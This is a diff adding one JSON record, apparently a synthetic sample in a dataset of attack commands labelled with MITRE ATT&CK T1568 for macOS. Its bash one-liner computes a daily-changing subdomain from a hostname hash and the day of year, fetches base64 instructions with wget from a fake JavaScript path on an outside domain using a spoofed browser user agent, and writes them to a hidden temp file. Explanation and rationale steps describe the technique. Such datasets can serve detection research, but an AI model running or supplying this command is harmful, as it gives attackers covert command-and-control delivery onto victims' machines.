@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "doy=$(date -u +%j); base=$(echo -n \"$(hostname)\" | md5 -q | cut -c1-6); label=$(printf \"%x\" $((0x$base ^ $doy))); d=\"$label.cdn-static-mirror.net\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; wget -qO- --user-agent=\"$ua\" \"http://$d/js/vendor.js\" | /usr/bin/base64 -D > /tmp/.calc_cmd",
+  "explanation": "Uses DNS calculation (hash/xor with day-of-year) to derive the active subdomain at runtime, then fetches base64-encoded instructions disguised as a JS library.",
+  "rationale_steps": [
+    "Compute deterministic subdomain from host hash and date (DNS calculation).",
+    "Resolve and fetch content with a common JS asset path to hide in plain sight.",
+    "Decode base64 instructions for local use."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-ace8b9c9",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
